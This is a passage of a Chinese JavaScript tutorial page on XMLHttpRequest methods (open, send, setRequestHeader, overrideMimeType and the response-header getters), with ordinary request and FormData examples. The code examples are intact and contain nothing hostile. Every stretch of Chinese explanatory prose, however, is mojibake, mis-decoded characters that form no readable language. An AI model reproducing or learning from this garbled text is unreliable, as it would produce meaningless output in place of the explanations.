<li><code>user</code>ï¼šè¡¨ç¤ºç”¨äºè®¤è¯çš„ç”¨æˆ·åï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</li> <li><code>password</code>ï¼šè¡¨ç¤ºç”¨äºè®¤è¯çš„å¯†ç ï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</li></ul> <p>æ³¨æ„ï¼Œå¦‚æœå¯¹ä½¿ç”¨è¿‡<code>open()</code>æ–¹æ³•çš„ AJAX è¯·æ±‚ï¼Œå†æ¬¡ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç­‰åŒäºè°ƒç”¨<code>abort()</code>ï¼Œå³ç»ˆæ­¢è¯·æ±‚ã€‚</p> <p>ä¸‹é¢å‘é€ POST è¯·æ±‚çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token function">encodeURI</span><span class="token punctuation">(</span><span class="token string">'someURL'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="xmlhttprequest-send"><a href="#xmlhttprequest-send" class="header-anchor">#</a> XMLHttpRequest.send()</h3> <p><code>XMLHttpRequest.send()</code>æ–¹æ³•ç”¨äºå®é™…å‘å‡º HTTP è¯·æ±‚ã€‚å®ƒçš„å‚æ•°æ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸å¸¦å‚æ•°ï¼Œå°±è¡¨ç¤º HTTP è¯·æ±‚åªæœ‰ä¸€ä¸ª URLï¼Œæ²¡æœ‰æ•°æ®ä½“ï¼Œå…¸å‹ä¾‹å­å°±æ˜¯ GET è¯·æ±‚ï¼›å¦‚æœå¸¦æœ‰å‚æ•°ï¼Œå°±è¡¨ç¤ºé™¤äº†å¤´ä¿¡æ¯ï¼Œè¿˜å¸¦æœ‰åŒ…å«å…·ä½“æ•°æ®çš„ä¿¡æ¯ä½“ï¼Œå…¸å‹ä¾‹å­å°±æ˜¯ POST è¯·æ±‚ã€‚</p> <p>ä¸‹é¢æ˜¯ GET è¯·æ±‚çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span>
  <span class="token string">'http://www.example.com/?id='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token boolean">true</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>GET</code>è¯·æ±‚çš„å‚æ•°ï¼Œä½œä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²é™„åŠ åœ¨ URL åé¢ã€‚</p> <p>ä¸‹é¢æ˜¯å‘é€ POST è¯·æ±‚çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">'email='</span>
  <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span>
  <span class="token operator">+</span> <span class="token string">'&amp;password='</span>
  <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'http://www.example.com'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>æ³¨æ„ï¼Œæ‰€æœ‰ XMLHttpRequest çš„ç›‘å¬äº‹ä»¶ï¼Œéƒ½å¿…é¡»åœ¨<code>send()</code>æ–¹æ³•è°ƒç”¨ä¹‹å‰è®¾å®šã€‚</p> <p><code>send</code>æ–¹æ³•çš„å‚æ•°å°±æ˜¯å‘é€çš„æ•°æ®ã€‚å¤šç§æ ¼å¼çš„æ•°æ®ï¼Œéƒ½å¯ä»¥ä½œä¸ºå®ƒçš„å‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">void</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">send</span><span class="token punctuation">(</span>ArrayBufferView data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">send</span><span class="token punctuation">(</span>Blob data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">send</span><span class="token punctuation">(</span>Document data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">send</span><span class="token punctuation">(</span>String data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">send</span><span class="token punctuation">(</span>FormData data<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>å¦‚æœ<code>send()</code>å‘é€ DOM å¯¹è±¡ï¼Œåœ¨å‘é€ä¹‹å‰ï¼Œæ•°æ®ä¼šå…ˆè¢«ä¸²è¡ŒåŒ–ã€‚å¦‚æœå‘é€äºŒè¿›åˆ¶æ•°æ®ï¼Œæœ€å¥½æ˜¯å‘é€<code>ArrayBufferView</code>æˆ–<code>Blob</code>å¯¹è±¡ï¼Œè¿™ä½¿å¾—é€šè¿‡ Ajax ä¸Šä¼ æ–‡ä»¶æˆä¸ºå¯èƒ½ã€‚</p> <p>ä¸‹é¢æ˜¯å‘é€è¡¨å•æ•°æ®çš„ä¾‹å­ã€‚<code>FormData</code>å¯¹è±¡å¯ä»¥ç”¨äºæ„é€ è¡¨å•æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'å¼ ä¸‰'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token string">'zhangsan@example.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'birthDate'</span><span class="token punctuation">,</span> <span class="token number">1940</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'/register'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>FormData</code>å¯¹è±¡æ„é€ äº†è¡¨å•æ•°æ®ï¼Œç„¶åä½¿ç”¨<code>send()</code>æ–¹æ³•å‘é€ã€‚å®ƒçš„æ•ˆæœä¸å‘é€ä¸‹é¢çš„è¡¨å•æ•°æ®æ˜¯ä¸€æ ·çš„ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>registration<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>registration<span class="token punctuation">'</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>/register<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>username<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>å¼ ä¸‰<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>email<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>email<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>zhangsan@example.com<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>number<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>birthDate<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>1940<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>return sendForm(this.form);<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸‹é¢çš„ä¾‹å­æ˜¯ä½¿ç”¨<code>FormData</code>å¯¹è±¡åŠ å·¥è¡¨å•æ•°æ®ï¼Œç„¶åå†å‘é€ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">sendForm</span><span class="token punctuation">(</span><span class="token parameter">form</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span><span class="token punctuation">;</span>
  formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'csrf'</span><span class="token punctuation">,</span> <span class="token string">'e69a18d7db1286040586e6da1950128c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> form<span class="token punctuation">.</span>action<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#registration'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sendForm</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="xmlhttprequest-setrequestheader"><a href="#xmlhttprequest-setrequestheader" class="header-anchor">#</a> XMLHttpRequest.setRequestHeader()</h3> <p><code>XMLHttpRequest.setRequestHeader()</code>æ–¹æ³•ç”¨äºè®¾ç½®æµè§ˆå™¨å‘é€çš„ HTTP è¯·æ±‚çš„å¤´ä¿¡æ¯ã€‚è¯¥æ–¹æ³•å¿…é¡»åœ¨<code>open()</code>ä¹‹åã€<code>send()</code>ä¹‹å‰è°ƒç”¨ã€‚å¦‚æœè¯¥æ–¹æ³•å¤šæ¬¡è°ƒç”¨ï¼Œè®¾å®šåŒä¸€ä¸ªå­—æ®µï¼Œåˆ™æ¯ä¸€æ¬¡è°ƒç”¨çš„å€¼ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªå•ä¸€çš„å€¼å‘é€ã€‚</p> <p>è¯¥æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå¤´ä¿¡æ¯çš„å­—æ®µåï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å­—æ®µå€¼ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Length'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç é¦–å…ˆè®¾ç½®å¤´ä¿¡æ¯<code>Content-Type</code>ï¼Œè¡¨ç¤ºå‘é€ JSON æ ¼å¼çš„æ•°æ®ï¼›ç„¶åè®¾ç½®<code>Content-Length</code>ï¼Œè¡¨ç¤ºæ•°æ®é•¿åº¦ï¼›æœ€åå‘é€ JSON æ•°æ®ã€‚</p> <h3 id="xmlhttprequest-overridemimetype"><a href="#xmlhttprequest-overridemimetype" class="header-anchor">#</a> XMLHttpRequest.overrideMimeType()</h3> <p><code>XMLHttpRequest.overrideMimeType()</code>æ–¹æ³•ç”¨æ¥æŒ‡å®š MIME ç±»å‹ï¼Œè¦†ç›–æœåŠ¡å™¨è¿”å›çš„çœŸæ­£çš„ MIME ç±»å‹ï¼Œä»è€Œè®©æµè§ˆå™¨è¿›è¡Œä¸ä¸€æ ·çš„å¤„ç†ã€‚ä¸¾ä¾‹æ¥è¯´ï¼ŒæœåŠ¡å™¨è¿”å›çš„æ•°æ®ç±»å‹æ˜¯<code>text/xml</code>ï¼Œç”±äºç§ç§åŸå› æµè§ˆå™¨è§£æä¸æˆåŠŸæŠ¥é”™ï¼Œè¿™æ—¶å°±æ‹¿ä¸åˆ°æ•°æ®äº†ã€‚ä¸ºäº†æ‹¿åˆ°åŸå§‹æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ MIME ç±»å‹æ”¹æˆ<code>text/plain</code>ï¼Œè¿™æ ·æµè§ˆå™¨å°±ä¸ä¼šå»è‡ªåŠ¨è§£æï¼Œä»è€Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°åŸå§‹æ–‡æœ¬äº†ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span><span class="token function">overrideMimeType</span><span class="token punctuation">(</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ³¨æ„ï¼Œè¯¥æ–¹æ³•å¿…é¡»åœ¨<code>send()</code>æ–¹æ³•ä¹‹å‰è°ƒç”¨ã€‚</p> <p>ä¿®æ”¹æœåŠ¡å™¨è¿”å›çš„æ•°æ®ç±»å‹ï¼Œä¸æ˜¯æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥é‡‡å–çš„æ–¹æ³•ã€‚å¦‚æœå¸Œæœ›æœåŠ¡å™¨è¿”å›æŒ‡å®šçš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥ç”¨<code>responseType</code>å±æ€§å‘Šè¯‰æœåŠ¡å™¨ï¼Œå°±åƒä¸‹é¢çš„ä¾‹å­ã€‚åªæœ‰åœ¨æœåŠ¡å™¨æ— æ³•è¿”å›æŸç§æ•°æ®ç±»å‹æ—¶ï¼Œæ‰ä½¿ç”¨<code>overrideMimeType()</code>æ–¹æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> arraybuffer <span class="token operator">=</span> xhr<span class="token punctuation">.</span>response<span class="token punctuation">;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'arraybuffer'</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="xmlhttprequest-getresponseheader"><a href="#xmlhttprequest-getresponseheader" class="header-anchor">#</a> XMLHttpRequest.getResponseHeader()</h3> <p><code>XMLHttpRequest.getResponseHeader()</code>æ–¹æ³•è¿”å› HTTP å¤´ä¿¡æ¯æŒ‡å®šå­—æ®µçš„å€¼ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ”¶åˆ°æœåŠ¡å™¨å›åº”æˆ–è€…æŒ‡å®šå­—æ®µä¸å­˜åœ¨ï¼Œè¿”å›<code>null</code>ã€‚è¯¥æ–¹æ³•çš„å‚æ•°ä¸åŒºåˆ†å¤§å°å†™ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">getHeaderTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getResponseHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Last-Modified&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'HEAD'</span><span class="token punctuation">,</span> <span class="token string">'yourpage.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span>onload <span class="token operator">=</span> getHeaderTime<span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>å¦‚æœæœ‰å¤šä¸ªå­—æ®µåŒåï¼Œå®ƒä»¬çš„å€¼ä¼šè¢«è¿æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—æ®µä¹‹é—´ä½¿ç”¨â€œé€—å·+ç©ºæ ¼â€åˆ†éš”ã€‚</p> <h3 id="xmlhttprequest-getallresponseheaders"><a href="#xmlhttprequest-getallresponseheaders" class="header-anchor">#</a> XMLHttpRequest.getAllResponseHeaders()</h3> <p><code>XMLHttpRequest.getAllResponseHeaders()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å‘æ¥çš„æ‰€æœ‰ HTTP å¤´ä¿¡æ¯ã€‚æ ¼å¼ä¸ºå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå¤´ä¿¡æ¯ä¹‹é—´ä½¿ç”¨<code>CRLF</code>åˆ†éš”ï¼ˆå›è½¦+æ¢è¡Œï¼‰ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°æœåŠ¡å™¨å›åº”ï¼Œè¯¥å±æ€§ä¸º<code>null</code>ã€‚å¦‚æœå‘ç”Ÿç½‘ç»œé”™è¯¯ï¼Œè¯¥å±æ€§ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'foo.txt'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> headers <span class="token operator">=</span> xhr<span class="token punctuation">.</span><span class="token function">getAllResponseHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>ä¸Šé¢ä»£ç ç”¨äºè·å–æœåŠ¡å™¨è¿”å›çš„æ‰€æœ‰å¤´ä¿¡æ¯ã€‚å®ƒå¯èƒ½æ˜¯ä¸‹é¢è¿™æ ·çš„å­—ç¬¦ä¸²ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">date:</span> Fri, 08 Dec 2017 21:04:30 GMT\r\n
<span class="token header-name keyword">content-encoding:</span> gzip\r\n
<span class="token header-name keyword">x-content-type-options:</span> nosniff\r\n
<span class="token header-name keyword">server:</span> meinheld/0.6.1\r\n
<span class="token header-name keyword">x-frame-options:</span> DENY\r\n
<span class="token header-name keyword">content-type:</span> text/html; charset=utf-8\r\n
<span class="token header-name keyword">connection:</span> keep-alive\r\n
<span class="token header-name keyword">strict-transport-security:</span> max-age=63072000\r\n
<span class="token header-name keyword">vary:</span> Cookie, Accept-Encoding\r\n
<span class="token header-name keyword">content-length:</span> 6502\r\n
<span class="token header-name keyword">x-xss-protection:</span> 1; mode=block\r\n<span class="token text-html">

</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>ç„¶åï¼Œå¯¹è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> arr <span class="token operator">=</span> headers<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex">/[\r\n]+/</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
